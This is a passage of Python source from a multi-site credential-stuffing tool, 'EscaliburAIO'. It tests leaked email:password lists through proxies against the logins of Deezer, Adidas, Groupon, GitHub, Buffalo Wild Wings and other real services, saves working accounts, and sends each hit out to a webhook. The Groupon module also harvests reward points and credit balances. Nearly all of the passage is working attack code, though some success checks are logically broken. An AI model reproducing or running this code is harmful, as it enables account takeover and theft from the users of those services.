        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Foodora"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=foodora_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def fileupload_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.file-up.org/login.html"

                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*"
                }
                f = sess.get(url, headers=headers)
                clisecret = search(r'name=\"token\" value=\"(.*?)\">', str(f.text)).group(1)
                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "origin":"https://www.file-up.org", 
                    "referer":"https://www.file-up.org/login.html" 
                }

                content = f"op=login&token={clisecret}&rand=&redirect=https%3A%2F%2Fwww.file-up.org%2F&login={email}&password={password}"

                r = sess.post("https://www.file-up.org/login.html", headers=headers, data=content)
                if "<li><a href=\"https://www.file-up.org/?op=my_account\">My Account</a></li>" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "<div class=\"alert alert-danger\" role=\"alert\">Incorrect Login or Password</div>" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=fileupload_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=fileupload_check, args=(emails, passwords, proxylist,)).start()
    def fileupload():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="File-Upload"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=fileupload_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def dollargg_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://dollar.gg/ajax?act=login"

                content = f"as-email={email}&as-pass={password}" 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "X-Requested-With":"XMLHttpRequest", 
                    "Referer":"https://dollar.gg/register" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "success" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "status\":\"false" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=dollargg_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=dollargg_check, args=(emails, passwords, proxylist,)).start()
    def dollargg():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Dollar.gg"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=dollargg_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def deezer_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.deezer.com/login?redirect_type=page&redirect_link=%2Fen%2F"  

                headers = {
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache" 
                }

                f = sess.get(url, headers=headers)

                url = "https://www.deezer.com/ajax/action.php" 
                content = f"type=login&mail={email}&password={password}" 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "referer":"https://www.deezer.com/login?redirect_type=page&redirect_link=%2Fen%2F" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "error" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "success" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=deezer_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=deezer_check, args=(emails, passwords, proxylist,)).start()
    def deezer():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Deezer"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=deezer_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def camarads_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.camarads.com/login" 

                headers = {
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache" 
                }

                f = sess.get(url, headers=headers)
                token = f.cookies.get("PHPSESSID")

                url = "https://www.camarads.com/login"
                content = f"email={email}&pass={password}&submit=submit" 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "accept":"*/*", 
                    "accept-encoding":"gzip, deflate, br", 
                    "accept-language":"de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6", 
                    "cookie":f"a_campaign=2; _ga=GA1.2.963188927.1557399143; PHPSESSID={token}; _gid=GA1.2.658428598.1558375320; _gat=1", 
                    "dnt":"1", 
                    "referer":"https://www.camarads.com/", 
                    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36", 
                    "x-requested-with":"XMLHttpRequest" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "Invalid user" or "Invalid email" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "good":
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=camarads_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=camarads_check, args=(emails, passwords, proxylist,)).start()
    def camarads():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Camarads"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=camarads_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def bufallo_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.buffalowildwings.com/en/account/"

                content = ""

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache" 
                }

                f = sess.post(url, data=content, headers=headers, allow_redirects=True)
                clid = search(r'{"ClientId":"(.*?)"', str(f.text)).group(1)
                clisecret = search(r'ClientSecret":"(.*?)"', str(f.text)).group(1)

                url = "https://api.buffalowildwings.com/api/v1/authorization/token"

                headers = {
                    "Content-Type":"application/json", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "x_client_id":f"{clid}", 
                    "x_client_secret":f"{clisecret}" 
                }

                content = {"grant_type":"password","username":email,"password":password}

                r = sess.post(url, json=content, headers=headers)

                if "Invalid email or password" or "statusCode\": 500" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "\"access_token" or "customer_id" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=bufallo_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=bufallo_check, args=(emails, passwords, proxylist,)).start()
    def bufallo():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Bufallo Wings"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=bufallo_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def amazingrdp_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://amazingrdp.com/whmcs/dologin.php"

                content = ""

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded",  
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",  
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",  
                    "Pragma":"no-cache", 
                    "referer":"https://amazingrdp.com/whmcs/clientarea.php",  
                    "origin":"https://amazingrdp.com" 
                }

                f = sess.get(url, data=content, headers=headers, allow_redirects=True)
                token = search(r'csrfToken = \'(.*?)\'', str(f.text)).group(1)

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "referer":"https://amazingrdp.com/whmcs/clientarea.php", 
                    "origin":"https://amazingrdp.com" 
                }

                url = "https://amazingrdp.com/whmcs/dologin.php"

                content = f"token={token}&username={email}&password={password}" 

                r = sess.post(url, data=content, headers=headers)
                if "Login Details Incorrect. Please try again." in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Your Active Products/Services" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=amazingrdp_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=amazingrdp_check, args=(emails, passwords, proxylist,)).start()
    def amazingrdp():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="AmazingRDP"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=amazingrdp_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def adidas_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://crm.adidas.com/accounts/authentication" 

                content = {"email":email,"password":password,"countryOfSite":"US","communicationLanguage":"en","pfStartSSOURL":"https://cp.adidas.com/idp/startSSO.ping","idpAdapterId":"adidasIdP10","partnerSpId":"sp:demandware","targetResource":"https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/MyAccount-ResumeLogin?target=account","inErrorResource":"https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/null","loginUrl":"https://www.adidas.com/us/myaccount-create-or-login"}

                headers = {
                    "Content-Type":"application/json", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "Accept":"application/json, text/javascript, */*; q=0.01", 
                    "Origin":"https://www.adidas.com", 
                    "Referer":"https://www.adidas.com/us/myaccount-create-or-login", 
                    "X-Client-Id":"62wi38jgwliizcyxz5f193dtfoweqywh" 
                }

                r = sess.get(url, data=content, headers=headers)
                if r.status_code == "200":
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif r.status_code == "403":
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=adidas_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=adidas_check, args=(emails, passwords, proxylist,)).start()
    def adidas():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Adidas"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=adidas_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def adfocus_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://adfoc.us/session/create"

                content = ""

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache" 
                }

                f = sess.get(url, data=content, headers=headers, allow_redirects=True)

                url = "https://adfoc.us/session/create"
                content = f"email={email}&password={password}"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "Referer":"https://adfoc.us/" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "EXISTING USERS, LOGIN" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "/session/destroy"  in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=adfocus_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=adfocus_check, args=(emails, passwords, proxylist,)).start()
    def adfocus():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="ADFocus"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=adfocus_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def groupon_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://api.groupon.de/api/mobile/UK/oauth/access_token?" 

                content = f"show=default&client_id=2960e238e4d7025db19d936e77461714&clien?t_version_id=18.9.154317&referrer=&password={password}&grant_type=password&username={email}"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "\"user\":{" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    rewardpoints = search(r'isVip\":(.*?)}', str(r.text)).group(1)
                    isvip = search(r'rewardPointsAvailable\":(.*?),', str(r.text)).group(1)
                    status = search(r'status\":\"(.*?)\"', str(r.text)).group(1)
                    creditsavaible = search(r'creditsAvailable\":{\"amount\":(.*?),', str(r.text)).group(1)
                    CurrencyCode = search(r'currencyCode\":\"(.*?)\"', str(r.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Reward-Points: {} | ISVip: {} | Status: {} | Credits-Avaible: {} | Currency-Code: {} |\n".format(email, password, rewardpoints, isvip, status, creditsavaible, CurrencyCode))
                elif "User credentials are invalid" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=groupon_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=groupon_check, args=(emails, passwords, proxylist,)).start()
    def groupon():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Groupon"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=groupon_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def github_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                headers = {
                    "content-type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache"
                }

                content = ""

                f = sess.get("https://github.com/login",data=content, headers=headers)

                csrf = search(r'token\" value=\"(.*?)\" />      ', str(f.text)).group(1)

                headers = {
                    "content-type":"application/x-www-form-urlencoded", 
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache" 
                }

                content = f"commit=Sign+in&utf8=%E2%9C%93&authenticity_token={csrf}&login={email}&password={password}" 

                r = sess.post("https://github.com/session", headers=headers, data=content)

